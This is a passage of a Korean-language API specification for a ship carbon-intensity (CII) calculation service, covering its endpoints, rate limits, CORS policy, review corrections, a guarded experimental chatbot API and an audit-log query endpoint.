| POST | `/api/v1/auth/verify-email/request` | 메일 인증 요청 | §1.2 |
| POST | `/api/v1/auth/verify-email/confirm` | 메일 인증 확인 | §1.2 |
| POST | `/api/v1/auth/password-reset/request` | 비밀번호 재설정 요청 | §1.2 |
| POST | `/api/v1/auth/password-reset/confirm` | 비밀번호 재설정 확인 | §1.2 |
| GET | `/api/v1/vessels` | 선박 목록 | §6.2 SCR-002 |
| POST | `/api/v1/vessels` | 선박 등록 | §6.2 SCR-002 |
| GET | `/api/v1/vessels/samples` | 샘플 선박 제원 목록 (#982) | §5.1 · §6.2 SCR-002 |
| GET | `/api/v1/vessels/{id}` | 선박 상세 | §6.2 SCR-002 |
| GET | `/api/v1/vessels/{id}/cii-history` | 연도별 CII 이력 | §6.2 SCR-008 |
| GET | `/api/v1/fleet/summary` | 선대 요약 (대시보드) | §6.2 SCR-001 |
| GET | `/api/v1/fleet/data-quality` | 데이터 점검 (#513) | `UIFLOW 2-11` · §17.4 |
| POST | `/api/v1/fleet/reduction-plans/evaluate` | 함대 감축 계획 계산 (#513) | `UIFLOW 2-10` · §12.3.2 |
| POST | `/api/v1/fleet/reduction-plans` | 함대 감축 계획 저장 (#513) | `UIFLOW 2-10` · §12.3.2 |
| GET | `/api/v1/fleet/reduction-plans` | 함대 감축 계획 목록 (#513) | `UIFLOW 2-10` |
| GET | `/api/v1/fleet/reduction-plans/{id}` | 함대 감축 계획 단건 (#513) | `UIFLOW 2-10` |
| PATCH | `/api/v1/vessels/{id}` | 선박 수정 | §6.2 SCR-002 |
| DELETE | `/api/v1/vessels/{id}` | 선박 삭제 | §6.2 SCR-002 |
| PATCH | `/api/v1/vessels/{id}/position` | 위치 갱신 | §6.2 SCR-001 |
| GET | `/api/v1/vessels/{id}/cii/current` | 실시간 CII 3종 값 | §3.3 · §6.2 SCR-009 |
| GET | `/api/v1/vessels/{id}/not-underway-periods` | not under way 구간 목록 | §3.3 |
| POST | `/api/v1/vessels/{id}/not-underway-periods` | not under way 구간 생성 | §3.3 |
| PATCH | `/api/v1/not-underway-periods/{id}` | 구간 수정 (종료 확정) | §3.3 |
| DELETE | `/api/v1/not-underway-periods/{id}` | 구간 삭제 (soft) | §3.3 |
| POST | `/api/v1/not-underway-periods/{id}/fuel-uses` | 구간 연료 추가 | §3.3 |
| DELETE | `/api/v1/not-underway-periods/{id}/fuel-uses/{fid}` | 구간 연료 삭제 | §3.3 |
| GET | `/api/v1/vessels/{id}/voyages` | 항차 목록 | §6.2 SCR-003 |
| POST | `/api/v1/vessels/{id}/voyages` | 항차 생성 | §6.2 SCR-003 |
| GET | `/api/v1/voyages/{id}` | 항차 상세 | §6.2 SCR-003 |
| PATCH | `/api/v1/voyages/{id}` | 항차 수정 | §6.2 SCR-003 |
| DELETE | `/api/v1/voyages/{id}` | 항차 삭제 | §8.1 |
| GET | `/api/v1/ports/samples` | 샘플 항만 목록 (#760) | §15.1 |
| GET | `/api/v1/ports/great-circle` | 좌표 기반 추정 거리 (#760) | §15.2 |
| GET | `/api/v1/ports/lookup` | 항만명 좌표 조회 (geocoding · #768) | §15.1 |
| POST | `/api/v1/voyages/{id}/transition` | 항차 상태 전환 | §8.1 |
| PUT | `/api/v1/voyages/{id}/actuals` | 항차 실적 입력 | §17.2 |
| POST | `/api/v1/calculations/voyage-cii` | 항차 CII 추정 | §10 (기능①) |
| GET | `/api/v1/calculations` | 계산 결과 조회 (hash 기반) | §1.9 |
| POST | `/api/v1/scenarios/compare` | 시나리오 비교 | §11 (기능②) |
| POST | `/api/v1/scenarios/{id}/adopt` | 시나리오 채택 | §11.8 |
| POST | `/api/v1/annual-simulations` | 연간 시뮬레이션 | §12 (기능③) |
| GET | `/api/v1/annual-simulations/{id}` | 시뮬레이션 결과 조회 | §12 |
| GET | `/api/v1/annual-simulations/{id}/snapshot-voyages` | 스냅샷 항차 상세 | TECH_SPEC §11 |
| POST | `/api/v1/annual-simulations/{id}/reproduce` | 동일 seed 재실행 | §12.4.3 |
| GET | `/api/v1/parameters/regulation-years` | 규정 연도 조회 | §6.2 SCR-006 |
| GET | `/api/v1/parameters/fuel-types` | 연료 조회 | §6.2 SCR-006 |
| GET | `/api/v1/parameters/reference-lines` | Reference line 조회 | §6.2 SCR-006 |
| GET | `/api/v1/parameters/rating-boundaries` | 등급 경계 조회 | §6.2 SCR-006 |
| POST | `/api/v1/parameters/import` | 파라미터 Import (사무직 전용 · #673) | §6.2 SCR-006 |
| GET | `/api/v1/voyages/{id}/report` | 항차 완료 리포트 (PDF·CSV·HTML) | §25.2 |
| GET | `/api/v1/vessels/{id}/annual-report` | 연간 실적 리포트 (PDF·CSV·HTML) | §25.3 |
| GET | `/api/v1/vessels/{id}/export` | CSV 내보내기 | §6.2 SCR-007 |
| POST | `/api/v1/vessels/{id}/import` | CSV 가져오기 | §6.2 SCR-007 |
| GET | `/api/v1/weather/snapshot` | 기상 스냅샷 (내부) | §15.3 |
| POST | `/api/v1/weather/refresh` | 기상 수동 갱신 (**열지 않는다 — `§9.2` 판정 `#767`**) | §15.3 |
| POST | `/api/v1/chat` | 챗봇 질의 (실험 · O-12) | §15 · PRD §7.8 |
| DELETE | `/api/v1/chat/sessions/{session_id}` | 대화 삭제 (GDPR 유사 삭제 요청) | §15.6 · PRD §16.3 |
| GET | `/api/v1/audit-logs` | 감사 로그 조회 (사무직 이상) | §16.1 · DB_SCHEMA §2.14 |

> **이 표는 `tests/test_api_spec_endpoints_sync.py`가 실제 라우트와 대조한다 (`#591`).** 세 방향을 함께 본다 — ⑴ 「미구현」으로 표시한 것은 정말 없는지 ⑵ 표시 없는 것은 정말 있는지 ⑶ **표에 없는 라우트가 코드에 있지는 않은지.** `#591` 실측에서 어긋남이 **양방향으로 6종** 나왔다: 문서에만 있던 3종(위 표시분)과, `#506`이 만들고 이 표에 등재되지 않은 3종(`PATCH`·`DELETE /auth/me` · `POST /auth/password-change`)이다. 뒤엣것은 `§1.2` 본문에는 있어 **같은 문서가 자기와 어긋난** 상태였다.

---

## 13. 비기능 요구사항 (API 관점)

### 13.1 성능 목표

> PRD §16.1 기준.

| 엔드포인트 | 목표 |
|---|---|
| `POST /calculations/voyage-cii` | p95 < 1초 |
| `POST /scenarios/compare` | p95 < 5초, 캐시 시 < 2초 |
| `POST /annual-simulations` (결정론) | p95 < 1초 |
| `POST /annual-simulations` (Monte Carlo 5000) | p95 < 3초 |
| 기본 CRUD | p95 < 500ms |

### 13.2 Rate Limiting

| 항목 | MVP 정책 |
|---|---|
| **인증 API** | **분당 10회** |
| 계산 API | 분당 60회 / 사용자 |
| CRUD API | 분당 300회 / 사용자 |
| **챗봇 API** (실험 · O-12) | **분당 10회** |
| 초과 시 | 429 Too Many Requests |

**인증 API 행은 `#811`이 추가했다.** 대상은 `POST /auth/login` · `/auth/signup` · `/auth/password-change` · `/auth/password-reset/request` · `/auth/verify-email/request` 다섯이다. `#1486`이 `/auth/tour-login`을 더해 **여섯**이다 — `dev-login`을 넣지 않은 이유(프로덕션 미등록)가 둘러보기에는 성립하지 않는다. **공개 주소에 항상 등록되므로** 기본 버킷(300)에 두면 코드가 분당 300회 추측된다. 종전에는 이 경로들이 CRUD 행(300)을 함께 썼는데, **로그인 300회/분은 무차별 대입 방어가 아니고**, 두 `request` 경로는 같은 한도 아래에서 **메일 발송 증폭기**로 쓰인다. `/auth/*/confirm` 두 경로는 넣지 않았다 — 토큰이 256비트 난수라 추측이 불가능하다.

**챗봇 버킷은 `#120`이 추가했다.** 대상은 `POST /chat` 하나다. 계산 버킷(60)을 함께 쓰지 않는 이유가 둘이다.

- **사람이 채팅을 치는 속도로 분당 10회면 넉넉하다.** 대화 한 턴에 응답까지 6초 이상 걸리는 것이 정상이고(`PRD §16.1` p95 2초 + 사용자가 읽고 다시 치는 시간), 분당 60회는 **사람이 낼 수 없는 속도**다.
- ⚠️ **챗봇은 호출마다 외부 LLM 비용이 붙는다.** 다른 API는 초과 호출이 서버 부하로 끝나지만 챗봇은 **금액**으로 끝난다. `PRD §16.1`의 쿼리당 상한이 「한 번」을 막고, 이 행이 **시간당 총액**을 막는다.

**네 버킷은 서로 독립이다.** 카운터가 `(버킷, 클라이언트)`별로 따로 돌므로, 인증 한도를 다 써도 계산·CRUD는 막히지 않는다. 한 클라이언트의 분당 상한은 네 값의 합이며 어느 한 행의 값이 아니다.

> ⚠️ **「/ 사용자」는 아직 구현과 다르다.** 현재 구현(`api/rate_limit.py`)은 **클라이언트 IP** 기준이다. `#238`이 *"MVP에는 인증(`#104`)이 없어 IP 기반으로 적용한다"*는 근거로 그렇게 두었고 `#104`는 이후 완료됐으나, 사용자 기준 전환은 **역방향 프록시 뒤에서 원 클라이언트를 어떻게 식별하는가**(`#786` ⑵ `USE_FORWARDED_FOR`)와 묶이므로 그 이슈에서 함께 다룬다. 표의 수치는 전환 후에도 그대로다.

### 13.3 CORS

| 항목 | 정책 |
|---|---|
| 허용 Origin | 동일 출처 또는 명시적 화이트리스트 |
| 허용 Method | **`*`** — 구현이 `allow_methods=["*"]`다 (`api/main.py`). 실제로 쓰는 것은 GET · POST · PATCH · PUT · DELETE · OPTIONS |
| 허용 Header | **`*`** — 구현이 `allow_headers=["*"]`다. 화면이 보내는 커스텀 헤더는 **`X-CSRF-Token` 하나**이고 나머지는 `Content-Type` 등 safelisted다 |

> 쿠키 기반 세션을 사용하므로 CORS 설정은 `allow_credentials = true`가 필요하며, **`allow_origins`에 와일드카드(`*`)를 쓸 수 없다.** 허용 출처를 명시적으로 나열한다 (#272).

> **[#1347] 표를 구현에 맞췄다 — 코드를 조이지 않았다.** 종전 표는 Method·Header를 **명시 목록**으로 적었으나 구현은 둘 다 `*`였다. ⑴ **보안 경계는 `allow_origins`다** — 그쪽은 이미 명시 목록이고, Method·Header의 `*`는 「브라우저가 보낼 수 있는 것」을 넓힐 뿐이다. ⑵ **`#1322`(클라우드 로그인 불성립)가 미해결**이고 그 진단 경로에 CORS가 걸려 있다 — 지금 동작을 바꾸면 살아 있는 문제의 원인 판별이 어려워진다. 조이는 것은 `#1322`과 **함께 판단할 사안**이다.
>
> ⚠️ 종전 표의 **`Authorization`은 이 제품이 쓰지 않는다** — 세션 쿠키 방식이라 그 헤더를 보내는 자리가 없다(`frontend/src` 실측 0건). 표에서 뺐다.

### 13.4 API 버전 관리

| 항목 | 정책 |
|---|---|
| 현재 버전 | v1 |
| 버전 표기 | URL prefix `/api/v1/` |
| 하위 호환성 | 필드 추가는 허용. 필드 제거/이름 변경은 v2 필요. |
| Deprecation | 최소 6개월 전 공지. `Deprecation` header 응답에 포함. |

---

## 14. Oracle Review Corrections (v1.1)

> 본 섹션은 Oracle 기술 검토(2026-07-03)에서 식별된 이슈를 기록하고, 각 이슈의 수정 위치와 상태를 추적한다.

### 14.1 Critical Issues

| ID | 이슈 | 수정 위치 | 상태 |
|---|---|---|---|
| API-ORACLE-C-1 | Layer 1 Decimal 값을 JSON number로 직렬화하여 정밀도 손실. JS `JSON.parse`가 float64로 truncation. | §1.7 수치 직렬화 정책 추가. Layer 1 값은 JSON 문자열로 직렬화 | **수정 완료** |
| API-ORACLE-C-2 | `WeatherFetchError` HTTP 매핑이 TECH_SPEC §12.1과 불일치. 503이 TECH_SPEC에 없음. | §1.4 status code 테이블 수정. 503 제거, 200+warning 및 422 두 경로로 분리 | **수정 완료** |
| API-ORACLE-C-3 | `parameters_used`가 계산 응답에 누락. TECH_SPEC §15.1에서 필수 의존성으로 명시. | §1.3.1, §4.1, §5.1, §6.1 응답에 `parameters_used` 추가 | **수정 완료** |
| API-ORACLE-C-4 | `CONFIRMED → ARCHIVED` 상태 전환 누락. PRD §8.1 상태 다이어그램에 명시됨. | §3.5 전환 테이블에 추가 | **수정 완료** |

### 14.2 Significant Issues

| ID | 이슈 | 수정 위치 | 상태 |
|---|---|---|---|
| API-ORACLE-S-1 | 시나리오 응답에 PRD §9.2 필수 필드 누락 (required_cii, ratio_to_required 등) | §5.1 각 시나리오 객체에 추가 | **수정 완료** |
| API-ORACLE-S-2 | 민감도 분석이 PRD §12.6의 5개 변수 중 3개만 커버. 거리 ±5%, 연료 CF 대체 누락 | §6.1 sensitivity_analysis에 추가 | **수정 완료** |
| API-ORACLE-S-3 | `random_seed` 타입/크기 불명확. JSON int는 2^53까지만 안전 | §6.1 필드 설명에 타입/범위 명시 | **수정 완료** |
| API-ORACLE-S-4 | reproduce 엔드포인트의 오류 시나리오 미정의 | §6.4 오류 테이블 추가 (409, 500) | **수정 완료** |
| API-ORACLE-S-5 | `calculation_basis` 필드명이 TECH_SPEC과 불일치 (a_coefficient vs a_decimal) | §4.1, §5.1 — TECH_SPEC 명명법(a_decimal, c)으로 통일 | **수정 완료** |
| API-ORACLE-S-6 | 항차 삭제 엔드포인트 없음 | §3.7 DELETE /voyages/{id} 추가 | **수정 완료** |
| API-ORACLE-S-7 | 스냅샷 항차 상세 조회 불가 | §6.3 GET /annual-simulations/{id}/snapshot-voyages 추가 | **수정 완료** |

### 14.3 Minor Issues

| ID | 이슈 | 수정 위치 | 상태 |
|---|---|---|---|
| API-ORACLE-M-1 | `slow_speed_kn`이 required이면서 기본값이 있어 모순 | §5.1 — optional로 변경 | **수정 완료** |
| API-ORACLE-M-2 | CORS 허용 method에 OPTIONS 누락 | §13.3 — OPTIONS 추가 | **수정 완료** |
| API-ORACLE-M-3 | `interaction_note`가 JSON 응답에 없음 | §6.1 — sensitivity_analysis 내에 추가 | **수정 완료** |
| API-ORACLE-M-4 | warning 코드가 PRD 예시와 상이 | §1.6 — 정규화 노트 추가 | **수정 완료** |
| API-ORACLE-M-5 | 헬스 체크 엔드포인트 없음 | §10 — GET /health 추가 | **수정 완료** |

### 14.4 Missing Topics

| ID | 누락 항목 | 추가 위치 | 상태 |
|---|---|---|---|
| API-ORACLE-MISS-1 | 계산 엔드포인트 멱등성 정책 누락 | §1.8 멱등성 섹션 추가 | **추가 완료** |
| API-ORACLE-MISS-2 | CSV import 보안 제한 미정의 | §8.2 보안 제한 테이블 추가 | **추가 완료** |
| API-ORACLE-MISS-3 | 선박 간 항차 통합 조회 불가 | §3.1 — MVP 범위 외로 명시 | **추가 완료** |

### 14.5 검토 요약

- **API_SPEC 품질 평가**: v1.0은 구조적으로 건전하나 수치 직렬화 정책 미정의(C-1), `parameters_used` 누락(C-3)이 Critical. v1.1에서 모두 해결.
- **하위 문서 준비도**: v1.1은 DB_SCHEMA, TEST_PLAN이 참조할 모든 API 계약을 포함. 수치 직렬화 정책(§1.7), 멱등성(§1.8), 오류 분류(§1.4), 보안 제한(§8.2)이 명확히 정의되어 하위 문서 작성이 차단 없이 진행 가능.

### 14.6 외부 리뷰 반영 (v1.2)

| ID | 이슈 | 수정 위치 | 상태 |
|---|---|---|---|
|| EXT-P0-1 | `effective_capacity`를 단일 값으로 사용 → IMO G1/G2 이중 capacity 분리 필요 | §4.1, §5.1 — `transport_capacity`/`reference_capacity` 분리 | **수정 완료** |
|| EXT-P0-4 | Voyage 생성 API에서 DRAFT + INCLUDE_AS_PLAN 충돌 | §3.3 — `annual_inclusion_policy`를 요청에서 제거, DRAFT는 EXCLUDE 강제 | **수정 완료** |
|| EXT-P0-5 | Scenario compare 응답에 `scenario_id` 누락 | §5.1 — 각 시나리오에 `scenario_id` 추가 | **수정 완료** |
|| EXT-3.1 | 시나리오 응답에 capacity 필드 누락 | §5.1 — `calculation_basis`에 capacity 필드 추가 | **수정 완료** |
| EXT-3.3/P1-5 | CSV formula injection strip이 데이터 훼손 위험 | §8.2 — strip 대신 apostrophe escape로 변경 | **수정 완료** |
| EXT-3.4/P1-6 | 오류 메시지 한국어 조사 처리 (`{field}은/는`) | §1.3.2, §11 — `field_label` 한글 라벨 도입 | **수정 완료** |
|| EXT-P1-2/3.2 | CalculationRun 조회 API 상세 누락 | §1.9 (신규) — GET /api/v1/calculations 상세 스펙 추가 | **추가 완료** |

> **[#132 후속 정정]** EXT-P0-1 반영 당시 §4.1·§5.1의 이중 capacity 분리는 완료됐으나, §1.7의 Layer 1 필드 열거에 `effective_capacity`가 남은 사실이 후속 확인됐다. #132에서 §1.7의 중복 필드 열거를 제거하고 endpoint별 응답 계약을 참조하도록 정정했다.

- **수정 소요**: Critical + Significant 이슈 해결에 약 2~3시간 소요 (문서 수정 기준).

---

---

## 15. Chat API (실험 · O-12) [#121]

> **실험 기능(MAY)이다.** `PRD §16.2`가 장애 격리를 규정한다 — 이 절의 엔드포인트가 죽어도 계산·보고 경로는 영향받지 않는다. 반대로 **이 절은 계산 엔진을 거치지 않고 수치를 만들지 않는다** (`PRD §16.3` No-Advice · `§16.3.1` 전송 화이트리스트).
>
> **절 번호를 15로 붙인 이유** — §11~§14는 요약·정정 절이라 API 계열을 그 앞에 끼우면 네 절과 그것을 가리키는 상위 문서의 참조가 전부 밀린다. 새 번호를 뒤에 붙이는 쪽이 참조를 건드리지 않는다.

### 15.1 챗봇 질의

```
POST /api/v1/chat
```

**요청**

| 필드 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `message` | string | ✅ | 사용자 질문. 1~2000자 — **입력 토큰 상한이 여기서 선다** (`PRD §16.1` 비용 가드) |
| `session_id` | UUID | — | 이어 갈 대화. 없으면 새로 만든다 |
| `vessel_id` | UUID | — | 화면이 보고 있는 선박. 계산 도구가 이 선박으로 돈다 |

#### 선박 결정 규칙 (#1242)

계산 도구가 어느 선박으로 도는가는 **우선순위** 하나로 정해진다.

| 우선순위 | 출처 | 비고 |
|---|---|---|
| 1 | **요청 `vessel_id`** | 화면이 「지금 보고 있는 선박」 — 그 턴에서만 이긴다. **세션 귀속은 바꾸지 않는다**(#1243 정정) — 요청이 오지 않은 다음 턴의 대답이 조용히 달라지면 안 된다 |
| 2 | **`chat_session.vessel_id`(세션 귀속)** | `search_vessel`의 **고유 일치**(1척)만 저장한다. 둘 이상 걸리면 **오류 봉투**「N척이 일치합니다. 화면에서 선박을 고른 뒤 다시 물어봐 주세요.」 — 애매한 것을 몰래 고르면 사용자가 고른 것이 아닌 배로 답한다 |
| — | 없음 | 계산 도구는 「어느 선박인지 먼저 정해야 합니다」 오류 봉투를 낸다 |

- 검색의 고유 일치는 **같은 턴의 이후 도구**에서 즉시 쓰이고 다음 턴까지 이어진다
- 모델에게는 종전대로 `matched` 수만 간다 — **선박명·IMO·식별자는 전송 금지 그대로**(`PRD §16.3.1`)

```json
{
  "message": "지금 등급이 어느 정도인가요?",
  "session_id": "8b1f3c2a-0000-4000-8000-000000000001",
  "vessel_id": "3f2a9c10-0000-4000-8000-000000000002"
}
```

**응답 200**

| 필드 | 타입 | 설명 |
|---|---|---|
| `data.session_id` | UUID | 이 대화의 id. 다음 요청에 그대로 넣는다 |
| `data.answer` | string | 자연어 응답 |
| `data.disclaimer` | string | **모든 응답에 붙는다.** `PRD §6.3` 챗봇 행의 문구와 **글자 그대로 같다** |
| `data.tool_calls` | string[] | 이 턴에서 실제로 실행한 도구 이름. 실행 순서대로 |
| `data.discarded` | boolean | `true`면 **모델의 답을 버렸다** — 아래 참조 |
| `data.vessel_resolved` | boolean | 서버가 이 대화의 선박을 알고 있는가 (#1242). **식별자 자체는 싣지 않는다** — 이 값은 화면을 위한 것이지 모델 전송이 아니다 |

> **[#1365] 이 표가 `data`의 키 전부다.** 실제 응답에 `tool_output_count`가 더 실리고 있었는데 표에 없었다 — 그 값은 **`tool_calls`의 길이와 늘 같았다**(도구 출력과 이름이 같은 자리에서 함께 쌓인다). 같은 값을 두 이름으로 내보내면 둘이 갈릴 자리가 생기므로 **응답에서 뺐다.** 화면은 쓰지 않았다(`frontend/src` 실측 0건).
>
> `tests/test_chat_api_db.py`가 **키 집합을 통째로** 잠근다 — 종전 계약 검사는 값 몇 개만 보아 **표에 없는 키가 늘어도 통과**했다.

```json
{
  "data": {
    "session_id": "8b1f3c2a-0000-4000-8000-000000000001",
    "answer": "현재 attained CII는 4.98, required CII는 5.04이며 등급은 C입니다.",
    "disclaimer": "이 답변은 화면의 계산 결과를 풀어 쓴 것입니다. 규제 판단의 근거가 아니며, 최종 확인은 IMO 규제 원문을 따릅니다.",
    "tool_calls": ["calc_voyage_cii"],
    "discarded": false,
    "vessel_resolved": true
  },
  "meta": { "request_id": "...", "timestamp": "2026-09-13T02:40:00Z" }
}
```

### 15.2 `discarded` — 답을 버리는 경우

**서버가 모델의 답을 검사해 통과하지 못하면 버린다.** 200을 내되 `discarded: true`와 함께 정해진 안내 문구를 `answer`에 담는다.

| 버리는 조건 | 근거 |
|---|---|
| 답변의 수치가 도구 응답에 없다 | `PRD §16.3` — 모델이 수학을 하면 안 된다. 계산은 계산 엔진만 한다. **허용 집합 = 이번 턴 도구 출력 + 이력 창의 이전 답변**(#1244 — 되묻는 후속 질문의 재인용은 폐기하지 않는다. 단, user 메시지의 수는 어디에도 들어가지 않는다) |
| **수치 뒤에 `%`가 붙었는데 도구 응답에 없다** | `#1334` ⑶ — 한 자리 수와 연도는 문장에 자연스럽게 섞여(「3가지」·「2026년」) 대조에서 빼는데, **백분율은 판단에 쓰이는 값**이다. 종전에는 도구가 `0.012345`를 준 답에서 지어낸 **「여유 7%」가 통과**했고(실측) 그 답이 「검증된 답」으로 저장돼 다음 턴에 다시 허용됐다 |
| 도구 호출이 한 턴 상한(3회)을 넘었다 | `PRD §16.1` 비용 가드 2 |
| **턴이 시간 상한(45초)을 넘었다** | `PRD §16.1` 가드 — 최악 경로(LLM 30초 × 왕복)가 DB 세션을 쥐던 것을 자른다 (#1245). 사용자 메시지는 저장돼 있고 답만 폐기된다(`#121`과 같은 모양) |
| 외부 모델 호출이 실패했다 | `PRD §16.2` 장애 격리 — 챗봇 안에서 끝낸다 |

> **왜 4xx가 아니라 200인가** — 버리는 것은 **사용자 잘못이 아니다.** 요청은 정상이었고 모델의 답이 규율을 어겼을 뿐이다. 4xx를 내면 화면이 「입력을 고치라」고 안내하게 되는데 고칠 입력이 없다.

### 15.3 전송 화이트리스트

이 엔드포인트가 외부 모델에 보내는 값은 `PRD §16.3.1` 목록으로 **제한된다**. 선박명·IMO·선박 ID·항만명·연료량·선사명·사용자 ID는 **보내지 않는다.**

- 도구 `search_vessel`은 **찾은 척수만** 돌려준다 — 이름도 식별자도 주지 않는다. 어느 선박으로 계산할지는 서버가 정한다.
- 계산 도구의 응답은 `attained_cii`·`required_cii`·`rating`·`risk_level`·`next_boundary_gap`만 나간다.
- **`next_boundary_gap`은 비율과 화면 백분율을 한 값에 담는다** — `"0.012345 (1.2%)"` (`#1334` ⑵). 화면은 `formatPercent`로 `1.2%`를 쓰는데(`DESIGN_SYSTEM §4.1` · 소수 1자리) 도구가 비율만 주면 **모델이 화면과 같은 표기로 답하는 순간 `§15.2`로 폐기됐다.** 키를 늘리지 않는 것은 화이트리스트가 **이름**을 검사하기 때문이다 — 같은 값이 두 이름으로 목록에 남는 것을 피한다.
- 구현은 `services/llm_guard.filter_outbound`가 강제하며, `tests/test_llm_guard.py`가 **이 문서의 표와 코드 상수를 대조**한다.

### 15.4 오류

| 조건 | status | code |
|---|---|---|
| `message` 누락·2000자 초과 | 422 | `VALIDATION_ERROR` |
| 남의 대화 `session_id` | 404 | `NOT_FOUND` |
| 분당 10회 초과 | 429 | `RATE_LIMIT_EXCEEDED` (`§13.2` `chat` 버킷) |
| `LLM_API_KEY` 미설정 | 503 | `CHAT_UNAVAILABLE` |
| **모델이 보낸 도구 인자가 빠졌거나 숫자가 아니다** | **200** | — (도구 오류 봉투 · `#1334` ⑴). 종전에는 `KeyError`·`InvalidOperation`·`ValueError`가 잡히지 않아 **턴 전체가 500**이 됐고, 롤백으로 **방금 저장한 사용자 질문까지 사라졌다**. 모델이 스스로 고쳐 다시 부를 수 있게 봉투로 되돌린다 |
| **외부 모델 호출 실패** | **200** | — (`discarded: true` · `§15.2`). 503이 아니다 (`#1365`) |

### 15.5 스트리밍을 쓰지 않는다

`#121` 본문은 SSE 스트리밍을 권장했으나 **쓰지 않는다.** 한 번에 응답을 만들고 화면은 로딩 표시를 띄운다.

근거 — ⑵ `§15.2`의 수학 검증은 **답 전체를 봐야** 판정할 수 있다. 토큰을 흘려보내면 이미 화면에 뜬 문장을 나중에 거둬들여야 하고, 그것은 「버린다」가 아니라 「보여 줬다가 지운다」다. ⑵ 응답 상한이 1024 토큰이라 체감 지연이 크지 않다.

### 15.6 `DELETE /chat/sessions/{session_id}` — 대화 삭제 [#1330]

`PRD §16.3` 「GDPR 유사 삭제 요청 지원」의 사용자 경로다. **종전에는 지우는 것이 90일 만료 일괄 삭제뿐**이라, 사용자가 「이 대화를 지워 달라」고 하면 기다리라는 말밖에 할 수 없었다.

| 항목 | 값 |
|---|---|
| 인증 | 필요 · CSRF 필요 |
| 성공 | **204** (본문 없음 — 지워진 대화를 돌려줄 수 없다) |
| 내 대화가 아니거나 없음 | **404** `NOT_FOUND` |
| 감사 | `CHAT_DELETE` — `entity_type=chat_session` · `entity_id`=대화 id |

- **403이 아니라 404다.** 403은 「있지만 네 것이 아니다」를 알려 주어 id를 바꿔 가며 **남의 대화가 존재하는지** 알아낼 수 있게 한다. `§15.1`이 조회에서 쓰는 규칙과 같다.
- **메시지는 FK `ON DELETE CASCADE`로 따라 지워진다.** 세션만 지우고 메시지가 남으면 「지웠다」가 거짓이 된다.
- **감사에 대화 내용을 적지 않는다** — 적으면 「지웠다」가 감사 로그에서 거짓이 된다. 다만 **지운 행은 되짚을 수 없으므로 이 기록이 삭제 요청에 응했다는 유일한 근거**다.

> **계정 전체 삭제는 `DELETE /auth/me`가 함께 처리한다** (`§1.2`). 탈퇴는 `app_user`를 soft delete하지만 **그 사용자의 대화는 실제로 지우고** 지운 수를 `ACCOUNT_DELETE.details_json.purged_chat_sessions`에 남긴다.

---

## 16. 감사 로그 조회 [#1241]

> **절 번호를 16으로 뒤에 붙인 이유**는 `§15`와 같다 — `§11`~`§14`가 요약·정정 절이라 API 계열을 그 앞에 끼우면 네 절과 그것을 가리키는 상위 문서 참조가 전부 밀린다.

### 16.1 `GET /api/v1/audit-logs`

`audit_log`는 **쌓이기만 하고 읽는 경로가 없었다** — 확인하려면 DB 직접 조회뿐이었다. `#673`이 `PARAMETER_IMPORT`로 **누가·언제·몇 행·어느 판본**을 적재했는지 남기게 해 두었는데, **그 기록에 닿을 방법이 제품 안에 없었다**(`IT-AUDIT-002`).

| 항목 | 값 |
|---|---|
| 인증 | 필요 · **사무직 이상**(`require_office`) |
| 정렬 | `timestamp desc, id desc` — 최신이 먼저 |
| 페이지 | 커서 방식. `limit` 기본 **20** · 최대 **100** (`§1.5`) |

**쿼리 파라미터** — 전부 선택이며 AND로 결합한다.

| 이름 | 타입 | 설명 |
|---|---|---|
| `action` | string | 감사 활동 코드. **아는 값만 받는다** — 목록은 `DB_SCHEMA §2.14` |
| `entity_type` | string | 대상 종류 (`app_user` · `voyage` · `chat_session` …) |
| `user_id` | string | 행위자 |
| `since` / `until` | ISO 8601 | 기간. **양끝을 포함한다** |
| `limit` | int | 1 이상. 초과는 100으로 자른다 |
| `cursor` | string | 이전 응답의 `meta.next_cursor` |

**응답 `data[]`**

| 필드 | 설명 |
|---|---|
| `id` · `timestamp` | 사건 식별자와 시각 |
| `action` · `entity_type` · `entity_id` | 무엇이 일어났고 무엇에 대해서인가 |
| `user_id` · `ip_address` | 누가·어디서. `user_id`는 `app_user.id` 문자열 — **그대로 남는다**(`?user_id=` 필터와 이어 붙일 키다) |
| `actor` | `{"display_name": string \| null, "email": string}` **또는 `null`** (`#1515`). `user_id`로 `app_user`를 푼 것 — **탈퇴(soft delete) 계정도 풀린다.** `null`은 「행위자를 못 찾았다」(`user_id`가 없거나 `app_user`에 없다)이고, `display_name: null`은 「찾았는데 이름을 안 적었다」다 — 둘은 다른 「없음」이다 |
| `details` | 활동별 부가 정보. `PARAMETER_IMPORT`는 행 수·판본·**`source_refs`**(`§7.5`) |

```json
{
  "id": "a3f1…",
  "timestamp": "2026-09-21T03:15:00+00:00",
  "action": "PARAMETER_IMPORT",
  "user_id": "6a8b3660-…",
  "actor": { "display_name": "홍길동", "email": "office@example.com" },
  "entity_type": "regulation_years",
  "entity_id": null,
  "details": { "imported_count": 3, "replaced_count": 1, "version": "import.20260921T031500Z", "dry_run": false, "source_refs": ["MEPC.400(83) amendment"] },
  "ip_address": "10.0.0.1"
}
```

**오류**

| 조건 | status | code |
|---|---|---|
| 모르는 `action` | 422 | `VALIDATION_ERROR` |
| 깨진 `cursor` | 422 | `VALIDATION_ERROR` |
| 현장직 | 403 | `FORBIDDEN` |

> **왜 사무직 이상인가.** 감사 로그에는 **사용자 식별자와 IP**가 들어 있다. 현장직에게는 자기 작업과 무관한 **남의 활동 기록**이고, `PRD §7.10`이 규정 파라미터 관리를 사무직 몫으로 두었으므로 그 이력도 같은 자리에서 본다.

> **모르는 `action`을 빈 목록으로 돌려주지 않는다.** 오타(`PARAMETER_IMPORTT`)를 0건으로 답하면 사용자는 **「그런 사건이 없다」**로 읽는다 — 「없다」와 「잘못 물었다」는 다른 답이다. 목록은 `services/audit.AUDIT_ACTIONS` 하나이며 `tests/test_audit_enum_sync.py`가 `DB_SCHEMA §2.14`와 대조한다.

> **`details`를 거르지 않는다.** 감사는 **사실만** 적는 자리이고(`TECH_SPEC §13.1`), 자격 증명은 **애초에 들어가지 않는다** — 기록 함수들이 담는 것은 수·상태·식별자뿐이다. 조회에서 다시 거르면 **거르는 규칙이 두 곳**에 생기고, 나중에 한쪽만 고쳐지면 「걸렀다」가 거짓이 된다.

